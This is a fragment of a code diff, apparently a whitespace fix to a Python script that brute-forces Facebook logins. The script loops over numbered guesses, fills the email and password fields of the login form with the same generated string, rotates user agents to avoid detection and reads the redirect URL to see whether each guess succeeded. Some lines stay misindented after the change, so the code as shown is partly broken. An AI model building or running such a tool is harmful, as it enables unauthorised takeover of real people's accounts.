@@ -50,11 +50,10 @@ home = 'https://web.facebook.com/home.php'
 incorrect = 'https://www.facebook.com/login.php?login_attempt=1&lwv=120&lwc=1348028'
 def attack(password,e,las):
 
-	c = 0
-	while(c < number):
-		
-		password +=1
-                
+    c = 0
+    while(c < number):
+        password += 1
+        
         try:
             print("\n\n\n [*] aCCount number {}".format(c+1))
             br.addheaders = [('User-agent', random.choice(useragents))]
@@ -64,9 +63,9 @@ def attack(password,e,las):
             ##Facebook
             p = str(password)
             br.form['email'] = e+p+las
-		     br.form['pass'] = e+p+las
-		     br.submit()
-		     log = br.geturl()
+            br.form['pass'] = e+p+las
+            br.submit()
+            log = br.geturl()
             print("[*] user name ",e+p+las)
                      print("[*] user password ", e+p+las)
              print(log[25:27])
